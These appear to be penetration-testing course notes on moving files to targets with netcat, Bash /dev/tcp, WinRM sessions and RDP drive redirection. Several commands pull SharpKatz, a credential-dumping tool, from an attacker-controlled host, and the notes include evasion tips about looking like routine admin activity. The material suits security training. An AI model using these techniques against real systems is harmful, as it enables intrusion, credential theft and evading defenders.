# NOTES — Miscellaneous File Transfer Methods

## ID
619

## Module
File Transfers

## Kind
notes

## Title
Section 5 — Miscellaneous File Transfer Methods

## Description
Netcat/Ncat transfers in both connection directions, Bash /dev/tcp as a netcat substitute, PowerShell Remoting (WinRM) file copy via PS sessions, and RDP drive redirection with xfreerdp/rdesktop/mstsc.

## Tags
netcat, ncat, dev-tcp, powershell-remoting, winrm, ps-session, rdp, xfreerdp, rdesktop, mstsc, tsclient

## Commands
- `nc -l -p 8000 > SharpKatz.exe`
- `ncat -l -p 8000 --recv-only > SharpKatz.exe`
- `nc -q 0 <ip> 8000 < SharpKatz.exe`
- `ncat --send-only <ip> 8000 < SharpKatz.exe`
- `sudo nc -l -p 443 -q 0 < SharpKatz.exe`
- `nc <ip> 443 > SharpKatz.exe`
- `cat < /dev/tcp/<ip>/443 > SharpKatz.exe`
- `Test-NetConnection -ComputerName <host> -Port 5985`
- `$Session = New-PSSession -ComputerName <host>`
- `Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`
- `Copy-Item -Path "C:\file.txt" -Destination C:\ -FromSession $Session`
- `rdesktop <ip> -d <domain> -u <user> -p '<pwd>' -r disk:linux='/home/user/share'`
- `xfreerdp /v:<ip> /d:<domain> /u:<user> /p:'<pwd>' /drive:linux,/home/user/share`
- `\\tsclient\<sharename>`

## What This Section Covers
Transfer techniques outside the "HTTP/FTP/SMB" trio: raw TCP via Netcat/Ncat, Bash `/dev/tcp` as a Netcat substitute, PowerShell Remoting (WinRM) `Copy-Item` between PS sessions, and RDP drive redirection through `\\tsclient\`.

## Netcat / Ncat Transfers

### Direction A — Target listens, attacker pushes
```bash
# Target (original nc):
nc -l -p 8000 > SharpKatz.exe

# Target (Ncat — needs --recv-only to close cleanly):
ncat -l -p 8000 --recv-only > SharpKatz.exe

# Attacker:
nc -q 0 <target-ip> 8000 < SharpKatz.exe        # original nc
ncat --send-only <target-ip> 8000 < SharpKatz.exe
```

`-q 0` (nc) and `--send-only` (Ncat) tell the sender to close once input is exhausted — without them, the pipe hangs open and you can't tell when the transfer finished.

### Direction B — Attacker listens, target pulls (use when target firewall blocks inbound)
```bash
# Attacker:
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# or
sudo ncat -l -p 443 --send-only < SharpKatz.exe

# Target:
nc <attacker-ip> 443 > SharpKatz.exe
ncat <attacker-ip> 443 --recv-only > SharpKatz.exe
```

### Bash `/dev/tcp` as nc substitute (no nc on target)
Attacker listens with nc/ncat as in Direction B; target does:
```bash
cat < /dev/tcp/<attacker-ip>/443 > SharpKatz.exe
```

> **Important:** Pwnbox aliases `nc`, `ncat`, `netcat` all to Ncat. Original `nc` flags like `-q` won't work — use `--send-only`/`--recv-only` instead.

## PowerShell Remoting (WinRM) File Transfer

When HTTP/HTTPS/SMB aren't usable but WinRM is enabled, use a PS Session to `Copy-Item` between hosts. Default WinRM ports: **TCP/5985 (HTTP), TCP/5986 (HTTPS)**.

### Prerequisites
- Admin on remote, OR member of **Remote Management Users**, OR explicit PS session-config permission.
- WinRM listener enabled on remote.

### Workflow
```powershell
# Verify reachable
Test-NetConnection -ComputerName DATABASE01 -Port 5985

# Create session
$Session = New-PSSession -ComputerName DATABASE01

# Push file to remote (this host → DATABASE01)
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Pull file from remote (DATABASE01 → this host)
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

`-ToSession` and `-FromSession` are the directional flags on `Copy-Item` — easy to mix up.

## RDP — Drive Redirection

### From Linux (rdesktop)
```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

### From Linux (xfreerdp)
```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/user/share
```

### From Windows (mstsc.exe)
Open mstsc → **Local Resources** tab → **More…** → check drives.

### Access the redirected share inside RDP session
- `\\tsclient\<sharename>` (the share is named whatever you mapped — `linux` in the examples above).
- The redirected drive is **only visible to the RDP user** — even other sessions on the same machine can't see it. Useful for stealth.

> Watch out — Windows Defender will scan files dropped through `\\tsclient\`. If the redirected dir has malware, Defender may delete from **your local Linux folder** through the redirected channel.

## When to Use What

| Constraint | Best method |
|------------|-------------|
| HTTP/HTTPS/SMB blocked, plain TCP port open | Netcat/Ncat on whichever port is allowed |
| No nc on target | `/dev/tcp` (Bash) or PowerShell raw TCP |
| WinRM enabled, AD admin | PS Session `Copy-Item -ToSession`/`-FromSession` |
| Already RDP'd in | `\\tsclient\` drive redirect |

## Lab — Questions & Answers
Source content does not include lab question text or answers (only point values shown).

## Key Takeaways
- **Netcat hangs forever** unless one side gets `-q 0` / `--send-only` / `--recv-only`. Without these, no way to know when the file finished.
- `\\tsclient\` is one of the easiest stealth transfer methods — no port to open, no listener to start, looks like normal RDP.
- PS Sessions are the cleanest method when you're already pivoting through AD with admin creds — no extra server, native logging looks like routine admin activity.
- Pwnbox `nc`/`ncat`/`netcat` are all the Ncat reimplementation — `-q` won't work, use `--send-only`/`--recv-only`.

## Gotchas
- File size has no built-in length indicator in raw nc transfers — corrupted/truncated files won't error, you only find out when the binary fails to run. **Always verify hashes.**
- `Copy-Item` over a PS Session has a default limit (~500 MB before slowdowns); use `-Force` if overwriting.
- `\\tsclient\` requires drive redirection enabled in the RDP client settings — many corp-hardened RDP configs disable it.
- Defender scans inside `\\tsclient\` — be aware your tools may get deleted off your **local** Linux share.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-transfers]]
← [[04-transferring-files-with-code]] | [[06-protected-file-transfers]] →
<!-- AUTO-LINKS-END -->
